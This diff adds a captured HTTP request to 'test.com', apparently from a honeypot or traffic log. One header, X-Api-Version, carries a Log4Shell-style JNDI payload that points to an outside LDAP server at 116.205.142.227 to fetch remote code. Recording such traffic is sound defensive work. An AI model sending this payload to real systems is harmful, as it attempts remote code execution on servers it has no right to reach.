@@ -1,0 +1,14 @@
+GET / HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 37.220.142.181
+Accept: */*
+User-Agent: curl/8.4.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 93.194.118.39,23.90.77.60
+X-Cloud-Trace-Context: 7c26847f0316909e3bbbe9eaa8948c89/5433705306041519150
+X-Api-Version: ${jndi:ldap://116.205.142.227:1389/a}
+
